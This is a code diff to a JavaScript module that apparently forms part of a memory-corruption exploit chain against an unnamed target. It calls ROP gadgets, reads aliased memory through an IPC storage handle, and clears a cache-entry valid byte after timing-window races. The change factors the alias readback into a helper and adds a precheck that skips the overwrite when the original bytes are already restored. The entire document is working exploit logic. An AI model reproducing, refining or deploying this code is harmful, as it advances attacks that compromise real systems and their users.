@@ -1,4 +1,5 @@
 import coreRuntime from "../runtime.mjs";
+import {emitVerboseStage} from "../log-stage.mjs";
 import {formatWaveSummaryLine, readHexBytes} from "./util.mjs";
 import {
   analyzeWave,
@@ -233,14 +234,65 @@ export async function qualifyCacheBucketPeriod(input) {
     return {ok: periodAliasOk, addressCopy};
 }
 
+function inspectCandidateCacheAlias(candidateHandle, addressCopy) {
+    if (!addressCopy || !addressCopy.config)
+        return {state: "unavailable", error: null, detail: "address baseline unavailable"};
+    var baseline = addressCopy.aliasControlHex;
+    var aliasBytes = addressCopy.primeHex;
+    if (!baseline || !aliasBytes || baseline === aliasBytes)
+        return {state: "unavailable", error: null, detail: "distinct baseline missing"};
+
+    try {
+        var verifyBuf = allocPage(0x1000);
+        call_rop(GADGET_MEMSET, verifyBuf, 0xA5n, 16n);
+        var readback = ipcStorageRead(candidateHandle,
+            addressCopy.config.ALIAS_OFFSET, 16, verifyBuf);
+        if (!readback || readback.error !== 0)
+            return {state: "unavailable", error: readback?.error ?? null,
+                detail: "candidate alias read failed"};
+
+        var readbackHex = readHexBytes(verifyBuf, 16);
+        if (readbackHex === baseline)
+            return {state: "original", error: readback.error, readbackHex};
+        if (readbackHex === aliasBytes)
+            return {state: "aliased", error: readback.error, readbackHex};
+        return {state: "unexpected", error: readback.error, readbackHex};
+    } catch (error) {
+        return {state: "unavailable", error: null,
+            detail: String(error?.message || error)};
+    }
+}
+
 export async function retireCandidateCache(input) {
     let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
     let candidateCacheRetired = input.candidateCacheRetired;
     let candidateHandle = input.candidateHandle;
     let addressCopy = input.addressCopy;
     if (!candidateHandle || !candidateCacheNeedsRetirement)
-        return {ok: true, addressCopy: {...addressCopy, candidateCacheRetired}};
-    await log("RETIRE: begin; clearing cache-entry valid byte");
+        return {ok: true, addressCopy: {...addressCopy, candidateCacheRetired},
+            retirementSkipped: false};
+
+    await log("RETIRE: begin; checking candidate alias before retirement waves");
+    var precheck = inspectCandidateCacheAlias(candidateHandle, addressCopy);
+    await log("RETIRE: precheck=" + precheck.state +
+        " read=" + (precheck.error == null ? "unavailable" : hex32(precheck.error)) +
+        (precheck.detail ? " detail=" + precheck.detail : ""));
+    if (precheck.state === "original") {
+        candidateCacheRetired = true;
+        addressCopy = {...addressCopy, candidateCacheRetired};
+        await emitVerboseStage("Candidate cache precheck=original · read=" +
+            hex32(precheck.error) + " · skipping retirement waves.");
+        await log("RETIRE: skipped; original content verified before retirement");
+        return {ok: true, addressCopy, candidateCacheRetired,
+            retirementSkipped: true};
+    }
+
+    await emitVerboseStage("Candidate cache precheck=" + precheck.state +
+        " · read=" + (precheck.error == null
+            ? "unavailable" : hex32(precheck.error)) +
+        (precheck.detail ? " · " + precheck.detail : "") +
+        " · running retirement waves.");
+    await log("RETIRE: clearing cache-entry valid byte");
     var retireBytes = [];
     for (var i = 0; i < 0x10; i++) retireBytes.push(0x42);
     var retirement = await installAddressHeader({...addressCopy,
@@ -249,30 +301,15 @@ export async function retireCandidateCache(input) {
     var retired = retirement.ok;
     var readback = null;
     if (!retired && addressCopy.workerStateSafe === true) {
-        var baseline = addressCopy.aliasControlHex;
-        var aliasBytes = addressCopy.primeHex;
-        if (baseline && aliasBytes && baseline !== aliasBytes) {
-            // A rejected timing window can still have cleared the valid byte.
-            // Only the candidate's original bytes prove that the alias is gone.
-            try {
-                var verifyBuf = allocPage(0x1000);
-                call_rop(GADGET_MEMSET, verifyBuf, 0xA5n, 16n);
-                readback = ipcStorageRead(candidateHandle,
-                    addressCopy.config.ALIAS_OFFSET, 16, verifyBuf);
-                var readbackHex = readback.error === 0
-                    ? readHexBytes(verifyBuf, 16) : "";
-                retired = readback.error === 0 && readbackHex === baseline;
-                await log("RETIRE: readback=" +
-                    (retired ? "original content verified" : "unconfirmed") +
-                    " read=" + hex32(readback.error) +
-                    " stillAliased=" + (readbackHex === aliasBytes));
-            } catch (readbackError) {
-                await log("RETIRE: readback threw: " +
-                    String(readbackError?.message || readbackError));
-            }
-        } else {
-            await log("RETIRE: readback unavailable (distinct baseline missing)");
-        }
+        // A rejected timing window can still have cleared the valid byte.
+        // Only the candidate's original bytes prove that the alias is gone.
+        readback = inspectCandidateCacheAlias(candidateHandle, addressCopy);
+        retired = readback.state === "original";
+        await log("RETIRE: readback=" + readback.state +
+            " read=" + (readback.error == null
+                ? "unavailable" : hex32(readback.error)) +
+            (readback.detail ? " detail=" + readback.detail : "") +
+            " stillAliased=" + (readback.state === "aliased"));
     }
     if (retired) {
         candidateCacheRetired = true;
@@ -280,5 +317,6 @@ export async function retireCandidateCache(input) {
     }
     await log("RETIRE: " + (retirement.ok
         ? "accepted" : retired ? "verified by readback" : "FAILED"));
-    return {ok: retired, addressCopy, candidateCacheRetired};
+    return {ok: retired, addressCopy, candidateCacheRetired,
+        retirementSkipped: false};
 }
